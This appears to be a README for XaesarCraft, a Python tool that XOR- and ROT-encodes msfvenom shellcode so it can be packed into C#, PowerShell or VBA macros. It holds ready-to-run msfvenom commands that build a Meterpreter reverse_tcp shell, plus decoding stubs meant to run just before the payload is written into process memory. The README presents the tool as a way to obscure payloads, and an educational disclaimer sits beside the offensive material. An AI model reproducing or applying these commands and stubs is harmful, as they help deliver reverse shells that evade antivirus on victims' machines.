# XaesarCraft

XaesarCraft is a Python script that enables you to apply different cryptographic operations (XOR, ROT13, or a combination of these algorithms - XOROT) to byte arrays and outputs the results in various formats. 
This tool is useful for processing payloads, especially those generated by msfvenom, in csharp or ps1 formats. Additionally, XaesarCraft can convert the payload into an array format suitable for VBA scripts.

## Disclaimer

This tool is intended for educational and research purposes only. It should not be used for any illegal activities. The author is not responsible for any misuse or damage caused by this program.

## Key Features:

1. Apply XOR, ROT13, or XOROT operations to payloads generated by msfvenom in csharp or ps1 formats
2. Convert payloads into VBA array format
4. Supports custom key for operations ( one for both )
5. Output results in Base64 encoding


## Example of usage:

```
# Using XOROT with default keys (13 for ROT13;) and 0xfa for XOR) to process a payload generated by msfvenom 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py 

# Using XOROT with default keys to process a payload generated by msfvenom and return result in VBA array for your macros
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --vba

# Using only ROT13 with custom key (0x13) to process a payload generated by msfvenom 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py -m rot -n 0x13

# Using XOROT with a custom key (0x13) to process a payload generated by msfvenom and retrun payload base64 encoded
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py -n 0x13 --b64

# Process an input string directly (e.g. a payload snippet), other keys aplies too
python3 XaesarCraft.py --input "[Byte[]] $buf = 0xf8,0xa5,0x6c,0x11,0xfc,0x05" 
```

## Decryption Codes
Decryption codes for the default mode only(!) (C#, PowerShell, VBA). It's recommended to use them just before writing to process memory;):

C#
```
byte xorValue = 0xfa; int rot = 13;
for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ xorValue); }
for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(((uint)buf[i] + rot)); }
```
PowerShell
```
$xorValue = 0xfa; $rot = 13; 
for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = [byte]($buf[$i] -bxor $xorValue); }
for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = [byte](([uint32]$buf[$i] + $rot)); }
```
VBA
```
Dim xorValue As Byte: xorValue = &Hfa
Dim rot As Integer: rot = 13
For i = 0 To UBound(buf): buf(i) = buf(i) Xor xorValue: Next i
For i = 0 To UBound(buf): buf(i) = (buf(i) + rot) Mod 256: Next i
```

## Target Audience

Designed for security researchers, penetration testers, and cybersecurity specialists, XaesarCraft offers comprehensive solutions for effectively creating and obscuring payloads, ensuring high levels of anonymity and protection.
